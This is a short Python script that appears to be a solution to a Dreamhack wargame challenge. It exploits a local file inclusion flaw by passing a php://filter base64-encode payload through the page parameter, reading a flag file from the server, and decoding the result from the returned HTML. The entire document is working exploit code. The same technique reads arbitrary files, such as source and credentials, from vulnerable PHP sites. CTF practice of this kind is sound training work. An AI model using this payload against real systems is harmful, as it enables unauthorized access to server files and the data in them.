import requests
import base64
from bs4 import BeautifulSoup as bs

URL = "http://host3.dreamhack.games:12015"
URI = "/?page="
PAYLOAD = "php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag"

resp = requests.get(URL + URI + PAYLOAD)
soup = bs(resp.text, "html.parser")

elements = soup.select('div.container')

ENCODED_TEXT = bytes(elements[1].text.replace(' ', '').replace('\n', ''), 'utf-8')

FLAG = base64.b64decode(ENCODED_TEXT).decode('utf-8')

print(FLAG)